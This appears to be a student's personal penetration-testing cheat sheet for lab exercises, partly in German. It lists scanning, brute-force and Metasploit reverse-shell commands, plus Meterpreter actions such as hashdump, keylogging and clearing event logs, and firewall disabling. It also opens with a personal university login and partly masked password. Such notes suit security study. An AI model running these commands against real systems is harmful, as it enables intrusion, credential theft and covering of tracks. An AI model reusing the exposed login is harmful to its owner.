ShareLatex: https://sharelatex.th-deg.de/login

- uname: florian.eder3@stud.th-deg.de

- Password: autogen xL....38

- Images: https://www.photo-pick.com/de/

---

[Pen Testing Tools Cheat Sheet](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)

[GitHub - ivan-sincek/penetration-testing-cheat-sheet: Work in progress...](https://github.com/ivan-sincek/penetration-testing-cheat-sheet)

https://www.revshells.com/

https://lolbas-project.github.io/#

https://gtfobins.github.io/

https://crackstation.net

https://www.kali.org/docs/general-use/using-eol-python-versions/

SecLists for Usernames and Passwords: **sudo apt-get -y install seclists**

---

Command remote: python3 -c 'import pty; pty.spawn("/bin/bash")'
Command remote: STRG-Z (Fenster in Hintergrund setzen)
Command lokal: stty raw -echo; fg
Command remote: export TERM=xterm

---

https://exploit-db.com

https://vulners.com/search

searchspolit --> /usr/share/exploitdb/exploits

getsplit --> pip install getsploit
            e.g. getsploit wordpress 4.7.0

---

default creds:

https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials

https://github.com/ihebski/DefaultCreds-cheat-sheet/blob/main/DefaultCreds-Cheat-Sheet.csv

[Default Passwords | CIRT.net](https://cirt.net/passwords)

[List of Default Passwords](https://datarecovery.com/rd/default-passwords/)

---

ncat:

- **rlwrap**: sudo apt install rlwrap

- Übertragung:
  
  - nc -nvlp 9001 > t.txt
  
  - nc <ip> < t.txt

---

nmap:

- nmap -sp / -sn 192.168.1.1/24 --> ping scan

- nmap (-sS) -sV <ip> --> sS stealth scan **sV Version detection**
  nmap -sV -pX file.xml <ip> --> searchsploit --nmap file.xml

- -O OS Detection

- **-A OS & Version Detection, Script Scanning, TraceRoute**

- nmap --script=<script> -p <port1,...,portN>
  Scripts: /usr/share/nmap/scripts
  e.g. nmap -p 135, 445 --script=smb-vuln-ms\*

---

enum4linux:

- enum4linux -a <ip>

---

nmblookup:

- nmblookup -A <ip>

---

wpscan:

- solve rerouting problems in  /etc/hosts:
  
  - <ip> <reroute_domain>

- wpscan --url 192.168.1.231/weblog (--wordlist /usr/share/wordlists/rockyou.txt --username admin/root/dev)

---

gobuster:

- gobuster dir --url http://10.10.107.189/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt 

---

ffuf:

- Uname enumeration: 
  ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.185.159/customers/signup -mr "username already exists"
- Password bruteforce:
  ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.185.159/customers/login -fc 200

---

feroxbuster:

- feroxbuster -u **http://**<ip>:<port>

---

hydra:

- basic: 
  hydra -l <username> -P <full path to pass list> MACHINE_IP

- post web form:
  hydra <username> <wordlist> MACHINE_IP http-post-form "<path>:<login_credentials>:<invalid_response>"
  e.g.
  `hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

---

metasploit:

- commands:
  
  - search [regex]
  
  - use exploit/[exploitpath] --> comes from search
  
  - set PAYLOAD [PayloadPath]
    e.g. set PAYLOAD windows/meterpreter/reverse_tcp
  
  - show options
  
  - set [Option] [Value]
  
  - exploit

- staged vs inline:
  
  - staged: größerer Payload, aber wird in einem Schritt übertragen --> Multihandler:
    
    - e.g.:
      msfconsole -q
      use exploit/multi/handler
      set PAYLOAD windows/shell_reverse_tcp
      set LHOST <attacker_ip>
      set LPORT <9000>
      exploit
  
  - **inline/stageless: kleiner, da Payload in zwei Schritten übertragen wird**

- msfvenom --list payloads | grep ...

- **meterpretershell bevorzugt!**
  
  - help
  
  - clearev
  
  - download <path>
  
  - ifconfig
  
  - migrate PID
  
  - sysinfo
  
  - background
  
  - shell
  
  - keyscan_start
  
  - getsystem
  
  - hashdump
  
  - run
    
    - checkvm
    
    - getgui
    
    - ...
  
  - ...

---

Linux:

- find / -user root -perm -4000 -print 2>/dev/null

- user in /etc/passwd file, passwörter in /etc/shadow, gruppen in /etc/group, sudoers in /etc/sudoers

- Sysvariablen: set

- which / locate / find / grep

- sudo -l --> Berechtigung über commands und Files
  
  - cp /bin/su --> file path

- sudo -i --> shell als root | sudo su

- history checken um vielleicht passwörter mit tippfehler zu finden

- https://tryhackme.com/room/linprivesc


---

Windows:

- https://lolbas-project.github.io/#

- netsh advfirewall set allprofiles state off

- https://tryhackme.com/room/windowsprivesc20
